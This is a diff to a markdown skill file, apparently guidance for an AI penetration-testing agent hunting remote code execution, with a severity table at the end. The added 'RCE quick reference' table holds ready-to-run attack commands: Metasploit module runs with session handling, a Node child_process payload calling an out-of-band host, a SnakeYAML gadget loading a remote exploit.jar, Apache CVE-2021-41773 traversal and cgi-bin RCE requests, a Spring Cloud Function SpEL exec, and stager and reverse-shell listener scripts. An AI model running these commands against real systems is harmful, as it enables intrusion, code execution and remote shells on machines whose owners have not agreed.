@@ -9,11 +9,32 @@ description: RCE hunting - template injection, YAML/XML deserialization, depende
 
 ## Wiki
 
-qmd_query "remote code execution command injection template injection deserialization CVE" via wiki-search MCP
-
 Hub: [[web-moc]] · Primary page: [[os-command-injection]] · Payload arsenal: `wiki/payloads/command-injection.md`
 Anchors: [[ssti]], [[insecure-deserialization]]
 **REFS:** [[os-command-injection]], wiki/payloads/command-injection.md
+
+qmd_query "remote code execution command injection template injection deserialization CVE" via wiki-search MCP — ONLY when you have a concrete hint the map above
+doesn't cover (a specific sink/version/CVE, an observed escape); not a blanket first step.
+
+## RCE quick reference (use this, don't hand-roll)
+
+Every command below is a real, tested invocation - the SAME primitive a hand-rolled exploit script
+would reimplement worse. Look the operation up here first; full context for each lives in the
+numbered methodology step. SSTI engine payloads are tabled separately under "Template Injection RCE
+Payloads" below - not repeated here.
+
+| Operation | Command | Step |
+|---|---|---|
+| Search/run a vetted Metasploit module for a fingerprinted CVE | `bash /root/vm.sh "msfconsole -q -x 'search <cve-or-product>; exit'"` then `use <mod>; set RHOSTS <ip>; set LHOST <vpn-ip>; run -z; sessions -l; exit` | 0 |
+| SSTI universal probe (every config/free-text field) | `{{7*7}}${7*7}#{7*7}<%= 7*7 %>*{7*7}` | 3 |
+| Server-side eval/exec sink, OOB-confirmed (Node example, test query AND body) | `curl -sG -X POST --data-urlencode 'cmd=require("child_process").exec("curl http://OOB/x")' TARGET` | 3b |
+| YAML deserialization gadget (SnakeYAML) | `!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[!!java.net.URL ["http://YOUR_COLLAB/exploit.jar"]]] ]` | 4 |
+| Apache CVE-2021-41773/42013 path-traversal file read | `curl --path-as-is "http://target/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"` | 5 |
+| Apache CVE-2021-41773/42013 cgi-bin RCE (cgi-bin alias required) | `curl --path-as-is -X POST -d "echo Content-Type: text/plain; echo; id" "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"` | 5 |
+| Spring Cloud Function SpEL (CVE-2022-22963) | `curl -X POST http://target:8080/functionRouter -H "Content-Type: text/plain" -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"id"})' --data "x"` | 6 |
+| Canary egress check before any callback-dependent payload | `curl -sm2 LHOST/canary` (fired through the sink) | Canary section |
+| Deliver a stager (serves it + prints the int-IP one-liner) | `bash scripts/stager.sh <lhost> [port] <payload>` | Canary section |
+| Managed reverse-shell listener | `bash scripts/vm-handler.sh <lhost>` | Canary section |
 
 ## Attack surface signals
 
@@ -153,8 +174,8 @@ Report the chain, not just the primitive: pre-auth RCE plus credential reuse imp
 
 | Outcome | Severity |
 |---|---|
-| Command output returned or OOB callback received (RCE) | critical |
-| SSTI reflected, reaches output but no exec primitive | high |
-| SSTI sandboxed - arithmetic only, no sandbox escape | medium |
+| Command output returned or OOB callback received (RCE) | CRITICAL |
+| SSTI reflected, reaches output but no exec primitive | HIGH |
+| SSTI sandboxed - arithmetic only, no sandbox escape | MEDIUM |
 
 Rate on demonstrated execution, not the theoretical ceiling. **Unauthenticated / pre-auth RCE outranks post-auth by a band.** A sink you can only trigger with a precondition you cannot meet (an admin-only field, an unreachable header) lowers it.
